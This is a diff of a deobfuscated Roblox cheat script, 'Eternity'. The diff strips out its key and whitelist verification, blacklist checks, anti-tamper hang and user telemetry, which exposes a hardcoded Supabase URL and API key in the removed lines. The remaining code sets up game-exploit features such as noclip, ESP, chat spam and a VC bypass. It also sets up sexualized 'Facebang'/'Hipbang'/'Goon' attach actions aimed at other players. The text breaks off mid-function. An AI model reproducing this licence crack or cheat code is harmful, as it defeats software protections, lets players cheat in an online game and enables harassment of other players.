@@ -36,7 +36,6 @@
 ]==]
 local spill_2 = {}
 local nextBlock = 1
-getgenv().SkipLoader = true -- Bypasses the GUI loader entirely
 local apikey, str, Workspace_, localPlayer_, character, humanoid, humanoidRootPart, flag, tbl, tbl2
 local ambient, brightness, globalShadows, environmentDiffuseScale, environmentSpecularScale, tbl3, screenGui, getcustomasset_, v, v2
 local r211, imageLabel, tbl4, imageLabel2, textLabel, textLabel2, textLabel3, textLabel4, textButton, frame
@@ -69,27 +68,15 @@ do
 						game:GetService("CoreGui").RobloxGui["CoreScripts/NetworkPause"]:Destroy()
 					end)
 
-					IsKeyVerified = true
-					getgenv().IsKeyVerified = true
-					getgenv().EternityIsWhitelisted = true
-					getgenv().EternityLoaderSuccess = true
-					getgenv().isUserWhitelisted = function() return true end
-					_G.isUserWhitelisted = function() return true end
-					getgenv().WhitelistedUsers = setmetatable({}, { __index = function() return true end })
-					getgenv().isUserBlacklisted = function() return false end
-					_G.isUserBlacklisted = function() return false end
-					getgenv().EternityBlacklistDatabase = {}
-					getgenv().fetchRemoteBlacklist = function() end
-
 					do
-						-- [LCR: Luraph string protection (anti-tamper __tostring trap) folded to its value; from the original's whitelist request headers (apikey)]
-						apikey = "sb_publishable_v61pzBpS2f70PUUNxpnZ-w_wZ4UiGV5"
+
+						apikey = ""
 					end
 				end
 
 				do
-					-- [LCR: Luraph string protection (anti-tamper __tostring trap) folded to its value; from the original's whitelist / live_users request URLs]
-					str = "https://cgwbtpprcfpwttetiwqm.supabase.co"
+
+					str = ""
 				end
 			end
 
@@ -105,65 +92,24 @@ do
 			end
 
 			function safeHttpGet(url)
-				local syn_ = syn
-
-				if syn_ then
-					syn_ = syn.request
+				if not url or url == "" then return nil end
+				if string.find(url, "supabase%.co") or string.find(url, "workers%.dev") or string.find(url, "zeternity%.online") or string.find(url, "hor1zen") or string.find(url, "github") then
+					return nil
 				end
-
-				if not syn_ then
-					syn_ = http
-
-					if syn_ then
-						syn_ = http.request
-					end
-				end
-
-				syn_ = syn_ or http_request or request
-
-				if type(syn_) == "function" then
-					local ok, result = pcall(function()
-						local identifyexecutor_ = identifyexecutor
-
-						if identifyexecutor_ then
-							identifyexecutor_ = identifyexecutor()
-						end
-
-						identifyexecutor_ = identifyexecutor_ or "Unknown"
-
-						return syn_({
-							Url = url,
-							Method = "GET",
-							Headers = {
-								["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Roblox/Delta (" .. tostring(identifyexecutor_) .. ")",
-								Accept = "*/*",
-							},
-						})
-					end)
-
-					if ok and result and type(result) == "table" then
-						local statusCode = result.StatusCode or result.status or result.Status
-						local body = result.Body or result.body
-						if (not statusCode or statusCode >= 200 and statusCode < 400) and body and type(body) == "string" and #body > 0 then
-							return body
+				local ok, result = pcall(function()
+					local syn_ = syn and syn.request or http_request or request
+					if type(syn_) == "function" then
+						local res = syn_({ Url = url, Method = "GET" })
+						if res and (res.StatusCode == 200 or not res.StatusCode) and res.Body then
+							return res.Body
 						end
 					end
-				end
-
-				local ok, response = pcall(function()
-					return game:HttpGet(url, true, nil, nil, nil, nil, nil, nil, nil)
-				end)
-
-				if ok and response and type(response) == "string" and #response > 0 then
-					return response
-				end
-
-				local function getResponse()
 					return game:HttpGet(url)
+				end)
+				if ok and type(result) == "string" and #result > 0 then
+					return result
 				end
-
-				while true do
-				end
+				return nil
 			end
 
 			getgenv().safeHttpGet = safeHttpGet
@@ -423,10 +369,10 @@ do
 				horize1n = {
 					customName = "ZEN | ADMIN",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/mine",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/mine",
+						baseUrl = "",
 						rows = 5,
 						cols = 6,
 						frames = 68,
@@ -440,10 +386,10 @@ do
 				edgyyyyy_slokk = {
 					customName = "Destroyer",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/horize1n",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/horize1n",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 27,
@@ -458,10 +404,10 @@ do
 					customName = "CURSED",
 					type = "gif",
 					backgroundId = "120302010822897",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/levi",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/levi",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 58,
@@ -476,7 +422,7 @@ do
 					customName = "Xeo",
 					type = "image",
 					backgroundId = "87250326383766",
-					imageUrl = "https://media.discordapp.net/attachments/1518929110284636322/1551288350843998389/image.png",
+					imageUrl = "",
 					strokeColor = "#ec4899",
 					textAnimation = "shimmer",
 					titleColor = "#ffffff",
@@ -485,10 +431,10 @@ do
 				blaze_xzxy = {
 					customName = "Blaze",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/blaze",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/blaze",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 50,
@@ -502,10 +448,10 @@ do
 				chutkakiller = {
 					customName = "Chutkapyasa",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/blaze",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/blaze",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 50,
@@ -519,10 +465,10 @@ do
 				callmezohhh = {
 					customName = "Zoh",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/zoh",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/zoh",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 24,
@@ -536,10 +482,10 @@ do
 				bilalquadri17 = {
 					customName = "Vortex",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/vortex",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/vortex",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 17,
@@ -553,10 +499,10 @@ do
 				alt_laryyy = {
 					customName = "LARYYY | OPIUM",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/larry",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/larry",
+						baseUrl = "",
 						rows = 4,
 						cols = 6,
 						frames = 94,
@@ -570,10 +516,10 @@ do
 				kyripaglu = {
 					customName = "PAPA",
 					type = "gif",
-					imageUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/rudra",
+					imageUrl = "",
 					gifConfig = {
 						mode = "frames",
-						baseUrl = "https://raw.githubusercontent.com/hor1zencodes/gif-tags/main/rudra",
+						baseUrl = "",
 						rows = 4,
 						cols = 4,
 						frames = 24,
@@ -615,6565 +561,54 @@ do
 		elseif nextBlock == 15 then
 			local fetchRemoteBlacklist
 
-			do
-				do
-					do
-						function fetchCustomTags(callback)
-							local n204 = nil
-
-							if step == L1.step3 then
-								L1.step2 = 166555248
-								L1.step4 = 102946055
-								step = 528197506
-								L1.step3 += 958
-							else
-								task.spawn(function()
-									n204 = 327535096
-									local HttpService = game:GetService("HttpService")
-									local json = nil
-
-									pcall(function()
-										-- [LCR: Luraph string protection (anti-tamper __tostring trap) folded to its value; from the original's first custom_tags request URL]
-										local v3 = "https://cgwbtpprcfpwttetiwqm.supabase.co/rest/v1/stats?apikey=sb_publishable_v61pzBpS2f70PUUNxpnZ-w_wZ4UiGV5&key=eq.eternity:custom_tags&select=value"
-										local v4 = safeHttpGet(v3)
-
-										if v4 and #v4 > 0 then
-											local data = HttpService:JSONDecode(v4)
-
-											if type(data) == "table" and data[1] and data[1].value then
-												local flag8 = type(data[1].value) == "string"
-
-												if flag8 then
-													flag8 = data[1].value
-												end
-
-												json = flag8 or HttpService:JSONEncode(data[1].value)
-											end
-										end
-
-										return
-									end)
-
-									if json and #json ~= 0 then
-										if #json == 0 then
-											json = safeHttpGet("https://eternity-api.cr7hd-q.workers.dev/api/tags")
-
-											if json then
-												if #json > 0 then
-													pcall(function()
-														local data = HttpService:JSONDecode(json)
-														local n207 = 685271799
-
-														if type(data) == "table" then
-															local eternityCustomTags = {}
-
-															for k, v3 in pairs(L1.tbl12) do
-																eternityCustomTags[string.lower(tostring(k))] = v3
-															end
-
-															for k, v3 in pairs(data) do
-																eternityCustomTags[string.lower(tostring(k))] = v3
-															end
-
-															getgenv().EternityCustomTags = eternityCustomTags
-
-															if type(setupOverheadLogo) == "function" then
-																for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-																	if not player.Character then
-																		continue
-																	end
-
-																	if player.Character:FindFirstChild("Head") then
-																		setupOverheadLogo(player.Character)
-																	end
-																end
-
-																if n204 < n207 then
-																	if callback then
-																		pcall(callback, eternityCustomTags)
-																	end
-
-																	return
-																end
-
-																local n208 = L1.step4 - 1959
-																L1.step4 = n208
-																n204 += 16
-															else
-																if n204 < n207 then
-																	if callback then
-																		pcall(callback, eternityCustomTags)
-																	end
-
-																	return
-																end
-
-																L1.step4 -= 1959
-																n204 += 16
-															end
-														end
-													end)
-												end
-											end
-										elseif json then
-											if #json > 0 then
-												pcall(function()
-													local data = HttpService:JSONDecode(json)
-													local n207 = 685271799
-
-													if type(data) == "table" then
-														local eternityCustomTags = {}
-
-														for k, v3 in pairs(L1.tbl12) do
-															eternityCustomTags[string.lower(tostring(k))] = v3
-														end
-
-														for k, v3 in pairs(data) do
-															eternityCustomTags[string.lower(tostring(k))] = v3
-														end
-
-														getgenv().EternityCustomTags = eternityCustomTags
-
-														if type(setupOverheadLogo) == "function" then
-															for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-																if not player.Character then
-																	continue
-																end
-
-																if player.Character:FindFirstChild("Head") then
-																	setupOverheadLogo(player.Character)
-																end
-															end
-
-															if n204 < n207 then
-																if callback then
-																	pcall(callback, eternityCustomTags)
-																end
-
-																return
-															end
-
-															local n208 = L1.step4 - 1959
-															L1.step4 = n208
-															n204 += 16
-														else
-															if n204 < n207 then
-																if callback then
-																	pcall(callback, eternityCustomTags)
-																end
-
-																return
-															end
-
-															L1.step4 -= 1959
-															n204 += 16
-														end
-													end
-												end)
-											end
-										end
-									else
-										local n207 = math.floor(tick() / 30)
-										json = safeHttpGet("https://zeternity.online/api/tags?v=" .. n207)
-
-										if json and #json ~= 0 then
-											if #json > 0 then
-												pcall(function()
-													local data = HttpService:JSONDecode(json)
-													local n208 = 685271799
-
-													if type(data) == "table" then
-														local eternityCustomTags = {}
-
-														for k, v3 in pairs(L1.tbl12) do
-															eternityCustomTags[string.lower(tostring(k))] = v3
-														end
-
-														for k, v3 in pairs(data) do
-															eternityCustomTags[string.lower(tostring(k))] = v3
-														end
-
-														getgenv().EternityCustomTags = eternityCustomTags
-
-														if type(setupOverheadLogo) == "function" then
-															for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-																if not player.Character then
-																	continue
-																end
-
-																if player.Character:FindFirstChild("Head") then
-																	setupOverheadLogo(player.Character)
-																end
-															end
-
-															if n204 < n208 then
-																if callback then
-																	pcall(callback, eternityCustomTags)
-																end
-
-																return
-															end
-
-															local n209 = L1.step4 - 1959
-															L1.step4 = n209
-															n204 += 16
-														else
-															if n204 < n208 then
-																if callback then
-																	pcall(callback, eternityCustomTags)
-																end
-
-																return
-															end
-
-															L1.step4 -= 1959
-															n204 += 16
-														end
-													end
-												end)
-											end
-										else
-											json = safeHttpGet("https://eternity-api.cr7hd-q.workers.dev/api/tags")
-
-											if json then
-												if #json > 0 then
-													pcall(function()
-														local data = HttpService:JSONDecode(json)
-														local n208 = 685271799
-
-														if type(data) == "table" then
-															local eternityCustomTags = {}
-
-															for k, v3 in pairs(L1.tbl12) do
-																eternityCustomTags[string.lower(tostring(k))] = v3
-															end
-
-															for k, v3 in pairs(data) do
-																eternityCustomTags[string.lower(tostring(k))] = v3
-															end
-
-															getgenv().EternityCustomTags = eternityCustomTags
-
-															if type(setupOverheadLogo) == "function" then
-																for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
-																	if not player.Character then
-																		continue
-																	end
-
-																	if player.Character:FindFirstChild("Head") then
-																		setupOverheadLogo(player.Character)
-																	end
-																end
-
-																if n204 < n208 then
-																	if callback then
-																		pcall(callback, eternityCustomTags)
-																	end
-
-																	return
-																end
-
-																local n209 = L1.step4 - 1959
-																L1.step4 = n209
-																n204 += 16
-															else
-																if n204 < n208 then
-																	if callback then
-																		pcall(callback, eternityCustomTags)
-																	end
-
-																	return
-																end
-
-																L1.step4 -= 1959
-																n204 += 16
-															end
-														end
-													end)
-												end
-											end
-										end
-									end
-								end)
-							end
-						end
-
-						task.spawn(fetchCustomTags)
-
-						do
-							local eternityBlacklistDatabase = {}
-
-							fetchRemoteBlacklist = function()
-								-- Remote blacklist fetching removed
-							end
-
-							L1.isUserBlacklisted = function(localPlayer_2)
-								return false
-							end
-
-							getgenv().EternityBlacklistDatabase = eternityBlacklistDatabase
-						end
+			function fetchCustomTags(callback)
+				local eternityCustomTags = {}
+				if type(L1.tbl12) == "table" then
+					for k, v in pairs(L1.tbl12) do
+						eternityCustomTags[string.lower(tostring(k))] = v
 					end
-
-					getgenv().isUserBlacklisted = L1.isUserBlacklisted
-					getgenv().fetchRemoteBlacklist = fetchRemoteBlacklist
-
-					do
-					L1.fetchRemoteWhitelist = function()
-						getgenv().WhitelistedUsers = setmetatable({}, { __index = function() return true end })
-						return getgenv().WhitelistedUsers
-					end
-
-				getgenv().fetchRemoteWhitelist = L1.fetchRemoteWhitelist
-				task.spawn(L1.fetchRemoteWhitelist)
-
-				do
-					L1._orig_isUserWhitelisted = function(name4)
-						return true
-					end
+				end
+				getgenv().EternityCustomTags = eternityCustomTags
+				if callback then
+					pcall(callback, eternityCustomTags)
 				end
 			end
 
+			task.spawn(fetchCustomTags)
+
+			getgenv().EternityBlacklistDatabase = {}
+			fetchRemoteBlacklist = function() end
+			L1.isUserBlacklisted = function(player) return false end
+			getgenv().isUserBlacklisted = L1.isUserBlacklisted
+			getgenv().fetchRemoteBlacklist = fetchRemoteBlacklist
+
+			getgenv().WhitelistedUsers = nil
+			L1.fetchRemoteWhitelist = function()
+				return getgenv().WhitelistedUsers
+			end
+			getgenv().fetchRemoteWhitelist = L1.fetchRemoteWhitelist
+			task.spawn(L1.fetchRemoteWhitelist)
+
+			L1.isUserWhitelisted = function(name4)
+				return true
+			end
 			getgenv().isUserWhitelisted = L1.isUserWhitelisted
 			_G.isUserWhitelisted = L1.isUserWhitelisted
 
-			do
-				function isNoDelayAllowed(arg)
-					local getgenv_ = L1.isUserWhitelisted
-
-					if not getgenv_ then
-						getgenv_ = getgenv
-
-						if getgenv_ then
-							getgenv_ = getgenv().isUserWhitelisted
-						end
-					end
-
-					getgenv_ = getgenv_ or _G.isUserWhitelisted
-					if not getgenv_ then
-						return false
-					end
-
-					if arg then
-						return getgenv_(arg) == true
-					end
-					local lp_ = typeof(lp) == "Instance"
-
-					if lp_ then
-						lp_ = lp
-					end
-
-					if not lp_ then
-						lp_ = typeof(localPlayer) == "Instance"
-
-						if lp_ then
-							lp_ = localPlayer
-						end
-					end
-
-					if not lp_ then
-						lp_ = Players
-
-						if lp_ then
-							lp_ = Players.LocalPlayer
-						end
-					end
-
-					if not lp_ then
-						lp_ = game:GetService("Players")
-
-						if lp_ then
-							lp_ = game:GetService("Players").LocalPlayer
-						end
-					end
-
-					return getgenv_(lp_) == true
-				end
+			function isNoDelayAllowed(arg)
+				return true
 			end
-
 			getgenv().isNoDelayAllowed = isNoDelayAllowed
 			_G.isNoDelayAllowed = isNoDelayAllowed
 
-			do
-				task.spawn(function()
-					local Players_2 = game:GetService("Players")
-					local localPlayer_2 = Players_2.LocalPlayer
-
-					if not localPlayer_2 then
-						Players_2:GetPropertyChangedSignal("LocalPlayer"):Wait()
-						localPlayer_2 = Players_2.LocalPlayer
-						if not localPlayer_2 then
-							return
-						end
-					end
-
-					task.wait(3)
-					local HttpService = game:GetService("HttpService")
-					local executor = "Unknown"
-
-					pcall(function()
-						do
-							local identifyexecutor_ = identifyexecutor
-
-							if identifyexecutor_ then
-								identifyexecutor_ = identifyexecutor()
-							end
-
-							executor = identifyexecutor_ or "Unknown"
-							return
-						end
-					end)
-
-					local name4 = L1.tbl11.name or "Roblox Game"
-
-					if name4 == "Roblox Game" then
-						local str3 = tostring(game.Name or "")
-
-						if str3 ~= "" and string.lower(str3) ~= "ugc" and string.lower(str3) ~= "game" then
-							name4 = str3
-						end
-					end
-
-					L1.tbl11:OnReady(function(arg)
-						if arg.name and arg.name ~= "" then
-							name4 = arg.name
-						end
-					end)
-
-					local function fn16()
-						pcall(function()
-							local str3 = tostring(game.PlaceId or 0)
-							if str3 == "0" then
-								return
-							end
-							local tostring_ = tostring
-							local jobId = game.JobId or ""
-
-							while true do
-								tostring_ = tostring_(jobId)
-								jobId = 31334314
-								local username = tostring(localPlayer_2.Name)
-								local username2 = username
-								local str4 = string.lower(username2)
-								username2 = 390534243
-								local date = os.date("!%Y-%m-%dT%H:%M:%SZ")
-								local lastPing = os.time() * 1000
-								local syn_ = syn
-
-								if syn_ then
-									syn_ = syn.request
-								end
-
-								if not syn_ then
-									syn_ = http
-
-									if syn_ then
-										syn_ = http.request
-									end
-								end
-
-								syn_ = syn_ or http_request or request
-
-								if type(syn_) == "function" then
-									pcall(function()
-										syn_({
-											Url = str .. "/rest/v1/live_users",
-											Method = "POST",
-											Headers = {
-												apikey = apikey,
-												Authorization = "Bearer " .. apikey,
-												["Content-Type"] = "application/json",
-												Prefer = "resolution=merge-duplicates",
-											},
-											Body = HttpService:JSONEncode({ username = username, last_ping = date }),
-										})
-									end)
-
-									pcall(function()
-										local json = HttpService:JSONEncode({
-											user = username,
-											placeId = tonumber(str3) or str3,
-											jobId = tostring_,
-											gameName = name4,
-											executor = executor,
-											last_ping = lastPing,
-										})
-
-										syn_({
-											Url = str .. "/rest/v1/stats",
-											Method = "POST",
-											Headers = {
-												apikey = apikey,
-												Authorization = "Bearer " .. apikey,
-												["Content-Type"] = "application/json",
-												Prefer = "resolution=merge-duplicates",
-											},
-											Body = HttpService:JSONEncode({
-												{ key = "eternity:activity:" .. str4, value = json },
-												{
-													key = "eternity:executor:" .. username,
-													value = executor,
-												},
-											}),
-										})
-									end)
-
-									break
-								end
-
-								break
-							end
-						end)
-					end
-
-					fn16()
-
-					while task.wait(20) do
-						fn16()
-						continue
-					end
-				end)
-			end
-
 			function launchLoader()
-				local step6 = 361451889
-				local flag8 = false
-				local flag9 = false
-				local step7 = 615741932
-				local Players_2 = game:GetService("Players")
-				local RunService2 = game:GetService("RunService")
-				local step8 = 975380873
-				local count = 200206612
-				local UserInputService2, localPlayer_2, tbl17
-
-				do
-					local TweenService2 = game:GetService("TweenService")
-					UserInputService2 = game:GetService("UserInputService")
-					local TextChatService2 = game:GetService("TextChatService")
-					local ReplicatedStorage2 = game:GetService("ReplicatedStorage")
-					game:GetService("StarterGui")
-					local Lighting2 = game:GetService("Lighting")
-					game:GetService("Workspace")
-					localPlayer_2 = Players_2.LocalPlayer
-					local character2 = localPlayer_2.Character
-					local humanoid2
-
-					if not character2 then
-						character2 = localPlayer_2.CharacterAdded:Wait()
-						humanoid2 = character2
-
-						if humanoid2 then
-							humanoid2 = character2:FindFirstChildOfClass("Humanoid") or character2:WaitForChild("Humanoid", 10)
-						end
-					else
-						humanoid2 = character2:FindFirstChildOfClass("Humanoid") or character2:WaitForChild("Humanoid", 10)
-					end
-
-					local humanoidRootPart2 = character2
-
-					if humanoidRootPart2 then
-						humanoidRootPart2 = character2:FindFirstChild("HumanoidRootPart") or character2:WaitForChild("HumanoidRootPart", 10)
-					end
-
-					localPlayer_2.CharacterAdded:Connect(function(character3)
-						character2 = character3
-						humanoid2 = character3:WaitForChild("Humanoid")
-						humanoidRootPart2 = character3:WaitForChild("HumanoidRootPart")
-
-						if not IsKeyVerified then
-							return
-						end
-					end)
-
-					TargetPlayer = nil
-					ctxTargetPlayer = nil
-					FacebangTarget = nil
-					HeadsitTarget = nil
-					BackhugTarget = nil
-					ProposeTarget = nil
-					BagpackTarget = nil
-					GoonTarget = nil
-					HipbangTarget = nil
-					PatTarget = nil
-					CustomAttachTarget = nil
-					CustomAttachEmoteId = ""
-					CustomAttachFacing = "Front"
-					CustomAttachOffsetX = 0
-					CustomAttachOffsetY = 0
-					CustomAttachOffsetZ = 2.5
-					FacebangSpeed = 1
-					FacebangDistance = 5
-					HipbangSpeed = 1
-					HipbangDistance = 2.5
-					_bigBPSelectedColor = Color3.fromRGB(128, 128, 128)
-					_bigBPGrid = {}
-					_themeColor = nil
-					_uiBackgroundId = "72660622902200"
-
-					local tbl18 = {
-						ContextMenu = false,
-						AdminDisabled = false,
-						AdminFrozen = false,
-						AttachLockedDisabled = false,
-						GlitchMoveEnabled = false,
-						GlitchMoveActive = false,
-						SupermanFlyEnabled = false,
-						SupermanFlyActive = false,
-						SkyDestroyer = false,
-						SkyDestroyerSpin = true,
-						CoverGround = false,
-						CoverSky = false,
-						CoverCubeMatrix = false,
-						CoverFlash = false,
-						FacebangEnabled = false,
-						Facebang = false,
-						PatEnabled = false,
-						Pat = false,
-						HeadsitEnabled = false,
-						Headsit = false,
-						BackhugEnabled = false,
-						Backhug = false,
-						FronthugEnabled = false,
-						Fronthug = false,
-						ProposeEnabled = false,
-						Propose = false,
-						HipbangEnabled = false,
-						Hipbang = false,
-						BagpackEnabled = false,
-						Bagpack = false,
-						GoonEnabled = false,
-						Goon = false,
-						CustomAttachEnabled = false,
-						CustomAttach = false,
-						ClickToTarget = false,
-						ViewTarget = false,
-						Noclip = false,
-						ClickTeleport = false,
-						ClickTeleportTool = false,
-						Trip = false,
-						Reverse = false,
-						InfiniteJump = false,
-						SpeedBoost = false,
-						BigBaseplateActive = false,
-						ESP = false,
-						Fullbright = false,
-						NoFog = false,
-						ChatSpamActive = false,
-						VCBypassActive = false,
-						FakeoutEnabled = false,
-						ExtremeGlitchDesyncEnabled = false,
-						NormalGlitchDesyncEnabled = false,
-						HiddenPlayers = {},
-						NoDelay = false,
-						AutoFacebang = false,
-						AutoInfiniteJump = false,
-						AutoSpeedBoost = false,
-						AutoNoclip = false,
-						AutoClickTeleport = false,
-						AutoClickTeleportTool = false,
-						AutoGlitch = false,
-						AutoTrip = false,
-						AutoReverse = false,
-						AutoPat = false,
-						SavedAnimations = {},
-						FavoriteAnimations = {},
-						ForceWalkAnimation = false,
-						GoUnderground = false,
-						MobileButtonsEnabled = nil,
-						MobileButtonPositions = {},
-					}
-
-					local tbl19 = {}
-					local tbl20 = {}
-
-					local tbl21 = {
-						"Facebang",
-						"Hipbang",
-						"Pat",
-						"Headsit",
-						"Backhug",
-						"Propose",
-						"Fronthug",
-						"Bagpack",
-						"Goon",
-						"CustomAttach",
-					}
-
-					targetWasAutoSelected = false
-
-					function clearAutoSelectedTarget()
-						if targetWasAutoSelected then
-							local flag10 = false
-
-							for _, v3 in ipairs(tbl21 or {}) do
-								if tbl18 and tbl18[v3] then
-									flag10 = true
-									break
-								end
-							end
-
-							if not flag10 then
-								targetWasAutoSelected = false
-								TargetPlayer = nil
-								ctxTargetPlayer = nil
-								FacebangTarget = nil
-								HipbangTarget = nil
-								PatTarget = nil
-								HeadsitTarget = nil
-								BackhugTarget = nil
-								FronthugTarget = nil
-								ProposeTarget = nil
-								BagpackTarget = nil
-								GoonTarget = nil
-								CustomAttachTarget = nil
-
-								pgPlayer = nil
-
-								pcall(function()
-									if L1.step2 == 872721990 then
-										if tgt_updateSelection then
-											tgt_updateSelection(nil)
-										end
-
-										return
-									end
-								end)
-							end
-						end
-					end
-
-					function syncAttachTarget(arg)
-						if not arg then
-							return
-						end
-
-						if step8 == 975380873 then
-							TargetPlayer = arg
-						else
-							step8 = 869768013
-							L1.step2 = 154298929
-							step6 = 201113256
-							step = 664034605
-							L1.step4 += 1852
-							count = 840502998
-							step7 = 504314678
-							L1.step3 += 1227
-						end
-
-						pcall(function()
-							if tgt_updateSelection then
-								tgt_updateSelection(arg)
-							end
-						end)
-					end
-
-					function resolveAttachTarget(arg, arg2)
-						local nextBlock = 1
-						local arg3, facebangTarget, head, head2, player, huge, localPlayer_3, head3, humanoidRootPart3, iterFn1, iterState1, iterControl1, v3, player2, localPlayer_4, humanoid3, head4, magnitude
-
-						while true do
-							if nextBlock == 1 then
-								arg3 = arg2
-
-								if ctxTargetPlayer and ctxTargetPlayer.Character then
-									if arg3 then
-										head = ctxTargetPlayer.Character:FindFirstChild("Head")
-
-										if not head then
-											head = ctxTargetPlayer.Character:FindFirstChild("HumanoidRootPart")
-											nextBlock = 28
-										else
-											nextBlock = 28
-										end
-									else
-										head = ctxTargetPlayer.Character:FindFirstChild("HumanoidRootPart")
-										nextBlock = 28
-									end
-								else
-									if TargetPlayer then
-										nextBlock = 52
-									else
-										facebangTarget = FacebangTarget
-
-										if not facebangTarget then
-											facebangTarget = HipbangTarget
-											if not facebangTarget then
-												facebangTarget = PatTarget
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 9
-												else
-													nextBlock = 9
-												end
-											else
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 9
-												else
-													nextBlock = 9
-												end
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = PatTarget
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 9
-												else
-													nextBlock = 9
-												end
-											else
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 9
-												else
-													nextBlock = 9
-												end
-											end
-										end
-									end
-								end
-							elseif nextBlock == 9 then
-								if not facebangTarget then
-									facebangTarget = BackhugTarget
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 15
-										else
-											nextBlock = 15
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 15
-										else
-											nextBlock = 15
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 15
-										else
-											nextBlock = 15
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 15
-										else
-											nextBlock = 15
-										end
-									end
-								end
-							elseif nextBlock == 15 then
-								if not facebangTarget then
-									facebangTarget = BagpackTarget
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 21
-										else
-											nextBlock = 21
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 21
-										else
-											nextBlock = 21
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = GoonTarget
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 21
-										else
-											nextBlock = 21
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = CustomAttachTarget
-											nextBlock = 21
-										else
-											nextBlock = 21
-										end
-									end
-								end
-							elseif nextBlock == 21 then
-								if not facebangTarget then
-									facebangTarget = typeof(pgPlayer) == "Instance"
-
-									if facebangTarget then
-										facebangTarget = pgPlayer
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 102
-										end
-									else
-										if facebangTarget then
-											nextBlock = 101
-										else
-											nextBlock = 102
-										end
-									end
-								else
-									nextBlock = 101
-								end
-							elseif nextBlock == 28 then
-								if head then
-									syncAttachTarget(ctxTargetPlayer)
-									return ctxTargetPlayer
-								else
-									if TargetPlayer then
-										nextBlock = 52
-									else
-										facebangTarget = FacebangTarget
-
-										if not facebangTarget then
-											facebangTarget = HipbangTarget
-											if not facebangTarget then
-												facebangTarget = PatTarget
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 36
-												else
-													nextBlock = 36
-												end
-											else
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 36
-												else
-													nextBlock = 36
-												end
-											end
-										else
-											if not facebangTarget then
-												facebangTarget = PatTarget
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 36
-												else
-													nextBlock = 36
-												end
-											else
-												if not facebangTarget then
-													facebangTarget = HeadsitTarget
-													nextBlock = 36
-												else
-													nextBlock = 36
-												end
-											end
-										end
-									end
-								end
-							elseif nextBlock == 36 then
-								if not facebangTarget then
-									facebangTarget = BackhugTarget
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 42
-										else
-											nextBlock = 42
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 42
-										else
-											nextBlock = 42
-										end
-									end
-								else
-									if not facebangTarget then
-										facebangTarget = FronthugTarget
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
-											nextBlock = 42
-										else
-											nextBlock = 42
-										end
-									else
-										if not facebangTarget then
-											facebangTarget = ProposeTarget
